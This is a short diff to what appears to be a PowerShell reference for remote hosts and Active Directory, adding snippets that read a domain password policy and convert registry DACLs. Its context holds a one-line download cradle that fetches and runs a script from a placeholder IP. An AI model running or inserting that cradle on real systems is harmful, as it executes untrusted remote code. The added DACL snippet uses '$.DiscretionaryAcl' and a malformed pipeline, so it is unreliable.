@@ -414,8 +414,17 @@ On the remote host, execute the following PowerShell script:
 IEX(New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/<script_name.ps1>')
 ```
 
+
 ### Get Domain Password Policy
 
 ```powershell
 $policy = Get-ADDefaultDomainPasswordPolicy -Credential $cred -Server $domain
+```
+
+
+### Convert DACL
+
+```powershell
+$acl = get-acl HKLM:\System\CurrentControlSet\Services
+ConvertFrom-SddlString -Sddl $acl -type RegistryRights | { Foreach-Object { $.DiscretionaryAcl } }
 ```
